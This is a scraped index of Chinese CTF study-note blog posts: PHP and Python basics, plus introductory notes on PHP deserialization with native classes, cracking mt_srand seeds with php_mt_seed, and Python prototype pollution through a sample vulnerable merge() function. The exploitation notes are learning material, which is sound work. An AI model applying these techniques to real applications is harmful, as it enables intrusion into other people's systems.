&#x3D;&gt;\n赋值运算符\n\n\n左\nand\n逻辑运算符\n\n\n左\nxor\n逻辑运算符\n\n\n左\nor\n逻辑运算符\n\n\n左\n,\n多处用到\n\n\n运算符优先级中，or 和 ||，&amp;&amp; 和 and 都是逻辑运算符，效果一样，但是其优先级却不一样\n3.PHP语句1.条件语句当您编写代码时，您常常需要为不同的判断执行不同的动作。您可以在代码中使用条件语句来完成此任务。\n在 PHP 中，提供了下列条件语句：\n\nif 语句 - 在条件成立时执行代码\nif…else 语句 - 在条件成立时执行一块代码，条件不成立时执行另一块代码\nif…elseif….else 语句 - 在若干条件之一成立时执行一个代码块\n\n由于if…elseif….else 语句包含其他语句所以只介绍它即可\n语法：\nif (条件)&#123;    if 条件成立时执行的代码;&#125;elseif (条件)&#123;    elseif 条件成立时执行的代码;&#125;else&#123;    条件不成立时执行的代码;&#125;\n\n实例：\n&lt;?php$t=date(&quot;H&quot;);if ($t&lt;&quot;10&quot;)&#123;    echo &quot;Have a good morning!&quot;;&#125;elseif ($t&lt;&quot;20&quot;)&#123;    echo &quot;Have a good day!&quot;;&#125;else&#123;    echo &quot;Have a good night!&quot;;&#125;?&gt;\n\n2.选择语句虽然switch好像是条件语句但我还是想单独拿出来\n如果您希望有选择地执行若干代码块之一，请使用 switch 语句。\n&lt;?phpswitch (expression) &#123;    case value1:        // 代码块1        break;    case value2:        // 代码块2        break;    // 更多的 case 语句    default:        // 如果没有匹配的值&#125;?&gt;\n\n参数说明：\n\nexpression 是要被比较的表达式。\ncase value: 是可能的值，如果 expression 的值等于某个 case 的值，就执行相应的代码块。\nbreak; 用于终止 switch 语句，防止继续执行下一个 case。\ndefault: 是可选的，用于指定当没有匹配的 case 时执行的代码块。\n\n实例：\n&lt;?php$favcolor=&quot;red&quot;;switch ($favcolor)&#123;case &quot;red&quot;:    echo &quot;你喜欢的颜色是红色!&quot;;    break;case &quot;blue&quot;:    echo &quot;你喜欢的颜色是蓝色!&quot;;    break;case &quot;green&quot;:    echo &quot;你喜欢的颜色是绿色!&quot;;    break;default:    echo &quot;你喜欢的颜色不是 红, 蓝, 或绿色!&quot;;&#125;?&gt;\n\n3.PHP循环语句while循环\nwhile 循环将重复执行代码块，直到指定的条件不成立。语法：\nwhile (条件)&#123;    要执行的代码;&#125;\n\n实例：\n$i=1;while($i&lt;=5)&#123;    echo &quot;The number is &quot; . $i . &quot;&lt;br&gt;&quot;;    $i++;&#125;\n\ndo…while循环\ndo…while 语句会至少执行一次代码，然后检查条件，只要条件成立，就会重复进行循环。\n语法：\ndo&#123;    要执行的代码;&#125;while (条件);\n\n实例：\n&lt;html&gt;&lt;body&gt;&lt;?php$i=1;do&#123;    $i++;    echo &quot;The number is &quot; . $i . &quot;&lt;br&gt;&quot;;&#125;while ($i&lt;=5);?&gt;&lt;/body&gt;&lt;/html&gt;\n\nfor循环\nfor 循环用于您预先知道脚本需要运行的次数的情况。\n实例：\n&lt;?phpfor ($i=1; $i&lt;=5; $i++)&#123;    echo &quot;数字为 &quot; . $i . PHP_EOL;//PHP_EOL为换行符&#125;?&gt;\n\nforeach循环\nforeach 循环用于遍历数组。\n语法：\nforeach ($array as $value)&#123;    要执行代码;&#125;foreach ($array as $key =&gt; $value)//和上面不同的是这个会把数据的键赋给$key变量&#123;    要执行代码;&#125;/*每进行一次循环，当前数组元素的值就会被赋值给 $value 变量（数组指针会逐一地移动），在进行下一次循环时，您将看到数组中的下一个值。*/\n\n实例：\n&lt;?php$x=array(1=&gt;&quot;Google&quot;, 2=&gt;&quot;Runoob&quot;, 3=&gt;&quot;Taobao&quot;);foreach ($x as $key =&gt; $value)&#123;    echo &quot;key  为 &quot; . $key . &quot;，对应的 value 为 &quot;. $value . PHP_EOL;&#125;?&gt;\n\n4.PHP数组1.数组的定义$car1=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);$car2=[&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;];两种定义数组的方式\n\n在 PHP 中，有三种类型的数组：\n\n数值数组 - 带有数字 ID 键的数组\n关联数组 - 带有指定的键的数组，每个键关联一个值\n多维数组 - 包含一个或多个数组的数组\n\n这里有两种创建数值数组的方法：\n自动分配 ID 键（ID 键总是从 0 开始）：\n$cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);下标从0开始自动分配\n\n人工分配 ID 键：\n$cars[0]=&quot;Volvo&quot;;$cars[1]=&quot;BMW&quot;;$cars[2]=&quot;Toyota&quot;;\n\nPHP关联数组\n关联数组是使用您分配给数组的指定的键的数组。\n这里有两种创建关联数组的方法：\n$age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;);$age[&#x27;Peter&#x27;]=&quot;35&quot;;$age[&#x27;Ben&#x27;]=&quot;37&quot;;$age[&#x27;Joe&#x27;]=&quot;43&quot;;\n\n多维数组即数组之间进行嵌套，数组中某个数据为数组\n2.数组中常用函数count()函数\ncount() 函数用于返回数组的长度（元素的数量）：\n&lt;?php$cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);echo count($cars);?&gt;//运行结果为:3\n\nPHP数组排序函数\n在本章中，我们将一一介绍下列 PHP 数组排序函数：\n\nsort() - 对数组进行升序排列\nrsort() - 对数组进行降序排列\nasort() - 根据关联数组的值，对数组进行升序排列\nksort() - 根据关联数组的键，对数组进行升序排列\narsort() - 根据关联数组的值，对数组进行降序排列\nkrsort() - 根据关联数组的键，对数组进行降序排列\n\n使用方法都一样，所以看一个就行了\n&lt;?php$cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);sort($cars);?&gt;\n\n\n\n5.PHP伪协议虽然PHP还有很多没学，但是考虑到我并不进行开发，好像也差不多了，其它的等需要的时候再学吧。因此，时机已到，现在正是这种时刻。\nphp:&#x2F;&#x2F; 是 PHP 中的一个虚拟协议（或称为流包装器），用于访问 PHP 内部流资源。它是 PHP 提供的内置流协议之一，允许你通过流（stream）方式访问 PHP 内部的数据流、文件或其他资源。与 file:&#x2F;&#x2F; 等协议不同，php:&#x2F;&#x2F; 并不直接映射到文件系统，而是用于处理 PHP 特有的资源，如输入输出流、临时文件、PHP 自身的内存流等。\n因为不是所有的都用得到，因此只写用得到的，其他的到时候补充\n1.php:&#x2F;&#x2F;inputphp:&#x2F;&#x2F;input是一个只读流，用于读取原始的 POST 数据。与 $_POST 不同，php://input 允许你直接访问 HTTP 请求中提交的原始数据，特别是对于非表单数据（如 JSON、XML 或其他自定义格式的内容）非常有用。\n语法：\nphp://in\n\n"},{"title":"PHP反序列化原生类漏洞利用","url":"/2025/09/27/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%94%9F%E7%B1%BB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/","content":"PHP反序列化原生类漏洞利用偶然做到题目用到了原生类才发现我根本就没记住用过的原生类，只好现在记一下了，但是感觉原生类考的还是不多\n1.原生类概念\nPHP原生类是指PHP语言内置的、无需额外安装或引入即可直接使用的类（达到条件自动触发，无需开发者自己编写）。这些类是PHP核心功能的一部分，提供了各种基础功能的面向对象实现。\nPHP原生类提供了强大的内置功能，开发者可以直接使用这些类而无需重新发明轮子。\n触发条件\n原生类中不会有wakeup和destruct魔术方法，所以我们需要通过原生累的其他魔术方法比如toString，call等去达到效果\n魔术方法需要自动触发而且要有用\n部分自带类拓展开启（如SoapClient类，需开启Soap 扩展）\n常见的原生类\n&lt;?php$classes = get_declared_classes();foreach ($classes as $class) &#123;    $methods = get_class_methods($class);    foreach ($methods as $method) &#123;        if (in_array($method, array(            &#x27;__construct&#x27;,            &#x27;__destruct&#x27;,            &#x27;__toString&#x27;,            &#x27;__wakeup&#x27;,            &#x27;__call&#x27;,            &#x27;__callStatic&#x27;,            &#x27;__get&#x27;,            &#x27;__set&#x27;,            &#x27;__isset&#x27;,            &#x27;__unset&#x27;,            &#x27;__invoke&#x27;,            &#x27;__set_state&#x27;        ))) &#123;            print $class . &#x27;::&#x27; . $method . &quot;\\n&quot;;        &#125;    &#125;&#125;\n\n执行这个代码可以列出原生类\n2.常见触发漏洞的原生类"},{"title":"PHP特性绕过","url":"/2025/10/27/PHP%E7%89%B9%E6%80%A7%E7%BB%95%E8%BF%87/","content":"PHP特性绕过这个博客主要就是收集一些在题目中遇到的一些小知识点然后避免忘记\n1.mt_srand伪随机数这个伪随机数之前就写过题目，只不过不知道为什么忘记了\n对于mt_srand这个函数通过种子生成的伪随机数，我们可以使用php_mt_seed实现爆破种子\n工具地址\n我们将其下载到Linux系统中然后对其进行\ngcc -o php_mt_seed php_mt_seed.c#我们的目录下就生成了一个可执行文件 php_mt_seed\n\n然后我们在后面接上随机数就可以反推出种子\n\n\n根据mt_rand在不同种子下会给出不同的随机数，于是可以根据不同php版本给出种子，实际使用的时候我们可以多尝试来判断php版本\n","tags":["PHP绕过"]},{"title":"Python","url":"/2025/01/02/Python/","content":"Python学习笔记前言感觉漏洞有点难，突然想到python还没学，也不好写脚本，仿佛看到救世主一般的来了，由于以前学过C语言，所以只挑重点学\n1.数据类型Python 支持三种不同的数值类型：\n\n整型(int) - 通常被称为是整型或整数，是正或负整数，不带小数点。Python3 整型是没有限制大小的，可以当作 Long 类型使用，所以 Python3 没有 Python2 的 Long 类型。布尔(bool)是整型的子类型。\n浮点型(float) - 浮点型由整数部分与小数部分组成，浮点型也可以使用科学计数法表示（2.5e2 &#x3D; 2.5 x 102 &#x3D; 250）\n复数( (complex)) - 复数由实数部分和虚数部分构成，可以用a + bj,或者complex(a,b)表示， 复数的实部a和虚部b都是浮点型。\n\n我们可以使用十六进制和八进制来代表整数：\n&gt;&gt;&gt; number = 0xA0F # 十六进制&gt;&gt;&gt; number2575&gt;&gt;&gt; number=0o37 # 八进制&gt;&gt;&gt; number31\n\n\n\n\nint\nfloat\ncomplex\n\n\n\n10\n0.0\n3.14j\n\n\n100\n15.20\n45.j\n\n\n-786\n-21.9\n9.322e-36j\n\n\n080\n32.3e+18\n.876j\n\n\n-0490\n-90.\n-.6545+0J\n\n\n-0x260\n-32.54e100\n3e+26J\n\n\n0x69\n70.2E-12\n4.53e-7j\n\n\n\nPython支持复数，复数由实数部分和虚数部分构成，可以用a + bj,或者complex(a,b)表示， 复数的实部a和虚部b都是浮点型。\n\nPython 数字类型转换\n有时候，我们需要对数据内置的类型进行转换，数据类型的转换，你只需要将数据类型作为函数名即可。\n\nint(x) 将x转换为一个整数。\nfloat(x) 将x转换到一个浮点数。\ncomplex(x) 将x转换到一个复数，实数部分为 x，虚数部分为 0。\ncomplex(x, y) 将 x 和 y 转换到一个复数，实数部分为 x，虚数部分为 y。x 和 y 是数字表达式。\n\n以下实例将浮点数变量 a 转换为整数：\n&gt;&gt;&gt; a = 1.0&gt;&gt;&gt; int(a)1\n\n数学函数\n\n\n\n函数\n返回值 ( 描述 )\n\n\n\nabs(x)\n返回数字的绝对值，如abs(-10) 返回 10\n\n\nceil(x)\n返回数字的上入整数，如math.ceil(4.1) 返回 5\n\n\ncmp(x, y)\n如果 x &lt; y 返回 -1, 如果 x &#x3D;&#x3D; y 返回 0, 如果 x &gt; y 返回 1。 Python 3 已废弃，使用 (x&gt;y)-(x&lt;y) 替换。\n\n\nexp(x)\n返回e的x次幂(ex),如math.exp(1) 返回2.718281828459045\n\n\nfabs(x)\n以浮点数形式返回数字的绝对值，如math.fabs(-10) 返回10.0\n\n\nfloor(x)\n返回数字的下舍整数，如math.floor(4.9)返回 4\n\n\nlog(x)\n如math.log(math.e)返回1.0,math.log(100,10)返回2.0\n\n\nlog10(x)\n返回以10为基数的x的对数，如math.log10(100)返回 2.0\n\n\nmax(x1, x2,…)\n返回给定参数的最大值，参数可以为序列。\n\n\nmin(x1, x2,…)\n返回给定参数的最小值，参数可以为序列。\n\n\nmodf(x)\n返回x的整数部分与小数部分，两部分的数值符号与x相同，整数部分以浮点型表示。\n\n\npow(x, y)\nx**y 运算后的值。\n\n\n[round(x ,n])\n返回浮点数 x 的四舍五入值，如给出 n 值，则代表舍入到小数点后的位数。其实准确的说是保留值将保留到离上一位更近的一端。\n\n\nsqrt(x)\n返回数字x的平方根。\n\n\n2.字符串字符串是 Python 中最常用的数据类型。我们可以使用引号( ‘ 或 “ )来创建字符串。\n创建字符串很简单，只要为变量分配一个值即可。例如：\nvar1 = &#x27;Hello World!&#x27;var2 = &quot;Runoob&quot;\n\nPython 访问字符串中的值\nPython 不支持单字符类型，单字符在 Python 中也是作为一个字符串使用。\nPython 访问子字符串，可以使用方括号 [] 来截取字符串，字符串的截取的语法格式如下：\n变量[头下标:尾下标]\n\n实例：\n#!/usr/bin/python3 var1 = &#x27;Hello World!&#x27;var2 = &quot;Runoob&quot; print (&quot;var1[0]: &quot;, var1[0])print (&quot;var2[1:5]: &quot;, var2[1:5])执行结果:var1[0]:  Hvar2[1:5]:  unoo\n\n1.Python 转义字符在需要在字符中使用特殊字符时，python 用反斜杠 ** 转义字符。如下表\n\n\n\n转义字符\n描述\n实例\n\n\n\n(在行尾时)\n续行符\n&gt;&gt;&gt; print(&quot;line1 \\ ... line2 \\ ... line3&quot;) line1 line2 line3 &gt;&gt;&gt; \n\n\n\\\n反斜杠符号\n&gt;&gt;&gt; print(&quot;\\\\&quot;) \\\n\n\n&#39;\n单引号\n&gt;&gt;&gt; print(&#39;\\&#39;&#39;) &#39;\n\n\n&quot;\n双引号\n&gt;&gt;&gt; print(&quot;\\&quot;&quot;) &quot;\n\n\n\\a\n响铃\n&gt;&gt;&gt; print(&quot;\\a&quot;)执行后电脑有响声。\n\n\n\\b\n退格(Backspace)\n&gt;&gt;&gt; print(&quot;Hello \\b World!&quot;) Hello World!\n\n\n\\000\n空\n&gt;&gt;&gt; print(&quot;\\000&quot;) &gt;&gt;&gt; \n\n\n\\n\n换行\n&gt;&gt;&gt; print(&quot;\\n&quot;)  &gt;&gt;&gt;\n\n\n\\v\n纵向制表符\n&gt;&gt;&gt; print(&quot;Hello \\v World!&quot;) Hello        World! &gt;&gt;&gt;\n\n\n\\t\n横向制表符\n&gt;&gt;&gt; print(&quot;Hello \\t World!&quot;) Hello    World! &gt;&gt;&gt;\n\n\n\\r\n回车，将 \\r 后面的内容移到字符串开头，并逐一替换开头部分的字符，直至将 \\r 后面的内容完全替换完成。\n&gt;&gt;&gt; print(&quot;Hello\\rWorld!&quot;) World! &gt;&gt;&gt; print(&#39;google runoob taobao\\r123456&#39;) 123456 runoob taobao\n\n\n\\f\n换页\n&gt;&gt;&gt; print(&quot;Hello \\f World!&quot;) Hello        World! &gt;&gt;&gt; \n\n\n\\yyy\n八进制数，y 代表 0~7 的字符，例如：\\012 代表换行。\n&gt;&gt;&gt; print(&quot;\\110\\145\\154\\154\\157\\40\\127\\157\\162\\154\\144\\41&quot;) Hello World!\n\n\n\\xyy\n十六进制数，以 \\x 开头，y 代表的字符，例如：\\x0a 代表换行\n&gt;&gt;&gt; print(&quot;\\x48\\x65\\x6c\\x6c\\x6f\\x20\\x57\\x6f\\x72\\x6c\\x64\\x21&quot;) Hello World!\n\n\n\\other\n其它的字符以普通格式输出\n\n\n\n2.字符串运算符下表实例变量 a 值为字符串 “Hello”，b 变量值为 “Python”：\n\n\n\n操作符\n描述\n实例\n\n\n\n+\n字符串连接\na + b 输出结果： HelloPython\n\n\n*\n重复输出字符串\na*2 输出结果：HelloHello\n\n\n[]\n通过索引获取字符串中字符\na[1] 输出结果 e\n\n\n[ : ]\n截取字符串中的一部分，遵循左闭右开原则，str[0:2] 是不包含第 3 个字符的。\na[1:4] 输出结果 ell\n\n\nin\n成员运算符 - 如果字符串中包含给定的字符返回 True\n‘H’ in a 输出结果 True\n\n\nnot in\n成员运算符 - 如果字符串中不包含给定的字符返回 True\n‘M’ not in a 输出结果 True\n\n\nr&#x2F;R\n原始字符串 - 原始字符串：所有的字符串都是直接按照字面的意思来使用，没有转义特殊或不能打印的字符。 原始字符串除在字符串的第一个引号前加上字母 r（可以大小写）以外，与普通字符串有着几乎完全相同的语法。\nprint( r&#39;\\n&#39; ) print( R&#39;\\n&#39; )\n\n\n%\n格式字符串\n请看下一节内容。\n\n\n3.Python 字符串格式化Python 支持格式化字符串的输出 。尽管这样可能会用到非常复杂的表达式，但最基本的用法是将一个值插入到一个有字符串格式符 %s 的字符串中。\n在 Python 中，字符串格式化使用与 C 中 sprintf 函数一样的语法。\n#!/usr/bin/python3 print (&quot;我叫 %s 今年 %d 岁!&quot; % (&#x27;小明&#x27;, 10))输出结果：我叫 小明 今年 10 岁!感觉和C语言差不多\n\npython字符串格式化符号:\n\n\n\n符  号\n描述\n\n\n\n%c\n格式化字符及其ASCII码\n\n\n%s\n格式化字符串\n\n\n%d\n格式化整数\n\n\n%u\n格式化无符号整型\n\n\n%o\n格式化无符号八进制数\n\n\n%x\n格式化无符号十六进制数\n\n\n%X\n格式化无符号十六进制数（大写）\n\n\n%f\n格式化浮点数字，可指定小数点后的精度\n\n\n%e\n用科学计数法格式化浮点数\n\n\n%E\n作用同%e，用科学计数法格式化浮点数\n\n\n%g\n%f和%e的简写\n\n\n%G\n%f 和 %E 的简写\n\n\n%p\n用十六进制数格式化变量的地址\n\n\n格式化操作符辅助指令:\n\n\n\n符号\n功能\n\n\n\n*\n定义宽度或者小数点精度\n\n\n-\n用做左对齐\n\n\n+\n在正数前面显示加号( + )\n\n\n\n在正数前面显示空格\n\n\n#\n在八进制数前面显示零(‘0’)，在十六进制前面显示’0x’或者’0X’(取决于用的是’x’还是’X’)\n\n\n0\n显示的数字前面填充’0’而不是默认的空格\n\n\n%\n‘%%’输出一个单一的’%’\n\n\n(var)\n映射变量(字典参数)\n\n\nm.n.\nm 是显示的最小总宽度,n 是小数点后的位数(如果可用的话)\n\n\n4.Python三引号python三引号允许一个字符串跨多行，字符串中可以包含换行符、制表符以及其他特殊字符。实例如下\n#!/usr/bin/python3 para_str = &quot;&quot;&quot;这是一个多行字符串的实例多行字符串可以使用制表符TAB ( \\t )。也可以使用换行符 [ \\n ]。&quot;&quot;&quot;print (para_str)运行结果：这是一个多行字符串的实例多行字符串可以使用制表符TAB (    )。也可以使用换行符 [  ]。\n\n3.运算符只写不会的运算符\n1.Python位运算符按位运算符是把数字看作二进制来进行计算的。Python中的按位运算法则如下：\n下表中变量 a 为 60，b 为 13二进制格式如下：\na = 0011 1100b = 0000 1101-----------------a&amp;b = 0000 1100a|b = 0011 1101a^b = 0011 0001~a  = 1100 0011\n\n\n\n\n运算符\n描述\n实例\n\n\n\n&amp;\n按位与运算符：参与运算的两个值,如果两个相应位都为1,则该位的结果为1,否则为0\n(a &amp; b) 输出结果 12 ，二进制解释： 0000 1100\n\n\n|\n按位或运算符：只要对应的二个二进位有一个为1时，结果位就为1。\n(a | b) 输出结果 61 ，二进制解释： 0011 1101\n\n\n^\n按位异或运算符：当两对应的二进位相异时，结果为1\n(a ^ b) 输出结果 49 ，二进制解释： 0011 0001\n\n\n~\n按位取反运算符：对数据的每个二进制位取反,即把1变为0,把0变为1。**~x** 类似于 -x-1\n(~a ) 输出结果 -61 ，二进制解释： 1100 0011， 在一个有符号二进制数的补码形式。\n\n\n&lt;&lt;\n左移动运算符：运算数的各二进位全部左移若干位，由”&lt;&lt;”右边的数指定移动的位数，高位丢弃，低位补0。\na &lt;&lt; 2 输出结果 240 ，二进制解释： 1111 0000\n\n\n&gt;&gt;\n右移动运算符：把”&gt;&gt;”左边的运算数的各二进位全部右移若干位，”&gt;&gt;”右边的数指定移动的位数\na &gt;&gt; 2 输出结果 15 ，二进制解释： 0000 1111\n\n\n实例：\n#!/usr/bin/python3 a = 60            # 60 = 0011 1100 b = 13            # 13 = 0000 1101 c = 0 c = a &amp; b        # 12 = 0000 1100print (&quot;1 - c 的值为：&quot;, c) c = a | b        # 61 = 0011 1101 print (&quot;2 - c 的值为：&quot;, c) c = a ^ b        # 49 = 0011 0001print (&quot;3 - c 的值为：&quot;, c) c = ~a           # -61 = 1100 0011print (&quot;4 - c 的值为：&quot;, c) c = a &lt;&lt; 2       # 240 = 1111 0000print (&quot;5 - c 的值为：&quot;, c) c = a &gt;&gt; 2       # 15 = 0000 1111print (&quot;6 - c 的值为：&quot;, c)运行结果：1 - c 的值为： 122 - c 的值为： 613 - c 的值为： 494 - c 的值为： -615 - c 的值为： 2406 - c 的值为： 15 \n\n\n\n2.Python逻辑运算符Python语言支持逻辑运算符，以下假设变量 a 为 10, b为 20:\n\n\n\n运算符\n逻辑表达式\n描述\n实例\n\n\n\nand\nx and y\n布尔”与” - 如果 x 为 False，x and y 返回 x 的值，否则返回 y 的计算值。\n(a and b) 返回 20。\n\n\nor\nx or y\n布尔”或” - 如果 x 是 True，它返回 x 的值，否则它返回 y 的计算值。\n(a or b) 返回 10。\n\n\nnot\nnot x\n布尔”非” - 如果 x 为 True，返回 False 。如果 x 为 False，它返回 True。\nnot(a and b) 返回 False\n\n\n3.Python身份运算符身份运算符用于比较两个对象的存储单元\n\n\n\n运算符\n描述\n实例\n\n\n\nis\nis 是判断两个标识符是不是引用自一个对象\nx is y, 类似 id(x) &#x3D;&#x3D; id(y) , 如果引用的是同一个对象则返回 True，否则返回 False\n\n\nis not\nis not 是判断两个标识符是不是引用自不同对象\nx is not y ， 类似 **id(x) !&#x3D; id(y)**。如果引用的不是同一个对象则返回结果 True，否则返回 False。\n\n\n4.Python运算符优先级以下表格列出了从最高到最低优先级的所有运算符， 相同单元格内的运算符具有相同优先级。 运算符均指二元运算，除非特别指出。 相同单元格内的运算符从左至右分组（除了幂运算是从右至左分组）：\n\n\n\n运算符\n描述\n\n\n\n(expressions...),[expressions...], &#123;key: value...&#125;, &#123;expressions...&#125;\n圆括号的表达式\n\n\nx[index], x[index:index], x(arguments...), x.attribute\n读取，切片，调用，属性引用\n\n\nawait x\nawait 表达式\n\n\n**\n乘方(指数)\n\n\n+x, -x, ~x\n正，负，按位非 NOT\n\n\n*, @, /, //, %\n乘，矩阵乘，除，整除，取余\n\n\n+, -\n加和减\n\n\n&lt;&lt;, &gt;&gt;\n移位\n\n\n&amp;\n按位与 AND\n\n\n^\n按位异或 XOR\n\n\n&#96;\n&#96;\n\n\nin,not in, is,is not, &lt;, &lt;=, &gt;, &gt;=, !=, ==\n比较运算，包括成员检测和标识号检测\n\n\nnot x\n逻辑非 NOT\n\n\nand\n逻辑与 AND\n\n\nor\n逻辑或 OR\n\n\nif -- else\n条件表达式\n\n\nlambda\nlambda 表达式\n\n\n:=\n赋值表达式\n\n\n4.列表1.基本列表序列是 Python 中最基本的数据结构。\n序列中的每个值都有对应的位置值，称之为索引，第一个索引是 0，第二个索引是 1，依此类推。\nPython 有 6 个序列的内置类型，但最常见的是列表和元组。\n列表都可以进行的操作包括索引，切片，加，乘，检查成员。\n此外，Python 已经内置确定序列的长度以及确定最大和最小的元素的方法。\n列表是最常用的 Python 数据类型，它可以作为一个方括号内的逗号分隔值出现。\n列表的数据项不需要具有相同的类型\n创建一个列表，只要把逗号分隔的不同的数据项使用方括号括起来即可。如下所示：\nlist1 = [&#x27;Google&#x27;, &#x27;Runoob&#x27;, 1997, 2000]list2 = [1, 2, 3, 4, 5 ]list3 = [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;]list4 = [&#x27;red&#x27;, &#x27;green&#x27;, &#x27;blue&#x27;, &#x27;yellow&#x27;, &#x27;white&#x27;, &#x27;black&#x27;]\n\n访问列表中的值\n与字符串的索引一样，列表索引从 0 开始，第二个索引是 1，依此类推。\n通过索引列表可以进行截取、组合等操作。\n#!/usr/bin/python3list = [&#x27;red&#x27;, &#x27;green&#x27;, &#x27;blue&#x27;, &#x27;yellow&#x27;, &#x27;white&#x27;, &#x27;black&#x27;]print( list[0] )print( list[1] )print( list[2] )输出结果：redgreenblue\n\n索引也可以从尾部开始，最后一个元素的索引为 -1，往前一位为 -2，以此类推。\n#!/usr/bin/python3list = [&#x27;red&#x27;, &#x27;green&#x27;, &#x27;blue&#x27;, &#x27;yellow&#x27;, &#x27;white&#x27;, &#x27;black&#x27;]print( list[-1] )print( list[-2] )print( list[-3] )输出结果：blackwhiteyellow\n\n使用下标索引来访问列表中的值，同样你也可以使用方括号 [] 的形式截取字符，如下所示：\n#!/usr/bin/python3nums = [10, 20, 30, 40, 50, 60, 70, 80, 90]print(nums[0:4])#不输出下表为4的value 也可以用负索引输出结果：[10, 20, 30, 40]\n\n2.更新列表你可以对列表的数据项进行修改或更新，你也可以使用 append() 方法来添加列表项，如下所示：\n#!/usr/bin/python3list = [&#x27;Google&#x27;, &#x27;Runoob&#x27;, 1997, 2000]print (&quot;第三个元素为 : &quot;, list[2])list[2] = 2001print (&quot;更新后的第三个元素为 : &quot;, list[2])list1 = [&#x27;Google&#x27;, &#x27;Runoob&#x27;, &#x27;Taobao&#x27;]list1.append(&#x27;Baidu&#x27;)print (&quot;更新后的列表 : &quot;, list1)输出结果：第三个元素为 :  1997更新后的第三个元素为 :  2001更新后的列表 :  [&#x27;Google&#x27;, &#x27;Runoob&#x27;, &#x27;Taobao&#x27;, &#x27;Baidu&#x27;]\n\n3.删除列表元素可以使用 del 语句来删除列表中的元素，如下实例：\n#!/usr/bin/python3 list = [&#x27;Google&#x27;, &#x27;Runoob&#x27;, 1997, 2000] print (&quot;原始列表 : &quot;, list)del list[2]print (&quot;删除第三个元素 : &quot;, list)输出结果：原始列表 :  [&#x27;Google&#x27;, &#x27;Runoob&#x27;, 1997, 2000]删除第三个元素 :  [&#x27;Google&#x27;, &#x27;Runoob&#x27;, 2000]\n\n4.列表脚本操作符列表对 + 和 * 的操作符与字符串相似。+ 号用于组合列表，* 号用于重复列表。\n如下所示：\n\n\n\nPython 表达式\n结果\n描述\n\n\n\nlen([1, 2, 3])\n3\n长度\n\n\n[1, 2, 3] + [4, 5, 6]\n[1, 2, 3, 4, 5, 6]\n组合\n\n\n[‘Hi!’] * 4\n[‘Hi!’, ‘Hi!’, ‘Hi!’, ‘Hi!’]\n重复\n\n\n3 in [1, 2, 3]\nTrue\n元素是否存在于列表中\n\n\nfor x in [1, 2, 3]: print(x, end&#x3D;” “)\n1 2 3\n迭代\n\n\n5.列表截取与拼接Python 的列表截取与字符串操作类似，如下所示：\nL=[&#x27;Google&#x27;, &#x27;Runoob&#x27;, &#x27;Taobao&#x27;]\n\n\n\n\nPython 表达式\n结果\n描述\n\n\n\nL[2]\n‘Taobao’\n读取第三个元素\n\n\nL[-2]\n‘Runoob’\n从右侧开始读取倒数第二个元素: count from the right\n\n\nL[1:]\n[‘Runoob’, ‘Taobao’]\n输出从第二个元素开始后的所有元素\n\n\n列表还支持拼接操作：\n&gt;&gt;&gt; squares = [1, 4, 9, 16, 25]&gt;&gt;&gt; squares += [36, 49, 64, 81, 100]&gt;&gt;&gt; squares[1, 4, 9, 16, 25, 36, 49, 64, 81, 100]&gt;&gt;&gt;\n\n6.列表函数&amp;方法Python包含以下函数:\n\n\n\n序号\n函数\n\n\n\n1\nlen(list) 列表元素个数\n\n\n2\nmax(list) 返回列表元素最大值\n\n\n3\nmin(list) 返回列表元素最小值\n\n\n4\nlist(seq) 将元组转换为列表\n\n\nPython包含以下方法:\n\n\n\n序号\n方法\n\n\n\n1\nlist.append(obj) 在列表末尾添加新的对象\n\n\n2\nlist.count(obj) 统计某个元素在列表中出现的次数\n\n\n3\nlist.extend(seq) 在列表末尾一次性追加另一个序列中的多个值（用新列表扩展原来的列表）\n\n\n4\nlist.index(obj) 从列表中找出某个值第一个匹配项的索引位置\n\n\n5\nlist.insert(index, obj) 将对象插入列表\n\n\n6\n[list.pop(index&#x3D;-1]) 移除列表中的一个元素（默认最后一个元素），并且返回该元素的值\n\n\n7\nlist.remove(obj) 移除列表中某个值的第一个匹配项\n\n\n8\nlist.reverse() 反向列表中元素\n\n\n9\nlist.sort( key&#x3D;None, reverse&#x3D;False) 对原列表进行排序\n\n\n10\nlist.clear() 清空列表\n\n\n11\nlist.copy() 复制列表\n\n\n"},{"title":"Python原型链污染","url":"/2025/09/28/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/","content":"Python原型链污染为什么省赛都不考PHP啊，还喜欢考原型链污染，怎么办啊莫非要爆零了\nPython的原型链之前在SSTI中就遇见过了，但是当时全部想着去绕过过滤去了，根本没有理解Python的原型链和魔术方法和属性\n看了一下Python原型链污染好像和js差不多，都是通过一些属性来访问原型然后通过函数嵌套赋值的方式来实现对原型属性来赋值，然后就可以影响到继承自同意原型的其他类\n1.原型链在Python中每个对象都有一个原型，原型上定义了对象可以访问的属性和方法。当对象访问属性或方法时，会先在自身查找，如果找不到就会去原型链上的上级对象中查找，原型链污染攻击的思路是通过修改对象原型链中的属性，使得程序在访问属性或方法时得到不符合预期的结果。\n但是在Python中不会出现像js一样所有类共用一个原型的情况，而是每个链独立继承\nPython原型链污染和Nodejs原型链污染的根本原理一样，Nodejs是对键值对的控制来进行污染，而Python则是对类属性值的污染，且只能对类的属性来进行污染不能够污染类的方法。\n2.原型链污染我们先来看一下原型链污染的示例代码\nclass father:    secret = &quot;hello&quot;class son_a(father):    passclass son_b(father):    pass            #先定义son_a和b两个类继承自father父类def merge(src, dst):#原型链污染函数    for k, v in src.items(): #遍历payload中的键值对        print(f&quot;k:&#123;k&#125;\\t v:&#123;v&#125;&quot;)        if hasattr(dst, &#x27;__getitem__&#x27;):  #检查对象是否有__getitem__魔术方法也就是是否能进行字典操作，也就是检查dst是不是字典            if dst.get(k) and type(v) == dict: #如果payload的值为字典则进行函数嵌套和js的逻辑是一样的                merge(v, dst.get(k))            else:                dst[k] = v        